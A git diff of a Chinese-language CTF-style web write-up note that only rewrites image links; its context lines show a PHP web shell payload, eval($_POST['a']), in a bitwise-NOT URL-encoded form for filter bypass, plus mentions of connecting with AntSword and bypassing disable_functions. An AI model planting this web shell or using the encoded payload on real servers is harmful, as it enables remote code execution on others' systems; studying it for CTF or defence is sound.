@@ -1,4 +1,4 @@
-![[Pasted image 20221221195120.png|500]]
+![](<./img/Pasted image 20221221195120.png>)
 
 ---
 ```php
@@ -67,10 +67,10 @@ eval($_POST['a']) ==> %9a%89%9e%93%d7%db%a0%af%b0%ac%ab%a4%d8%9e%d8%a2%d6
 
 `Antsword`连接
 
-![[Pasted image 20221222114909.png|1000]]
+![](<./img/Pasted image 20221222114909.png>)
 
 直接用轮子绕过`disable_functions`（嗯，绝对不是`LD_PRELOAD`搞不来～）
 
-![[Pasted image 20221222120344.png]]
+![](<./img/Pasted image 20221222120344.png>)
 
 #Web #PHP #bypass #encoding #RCE #disable_functions #antsword
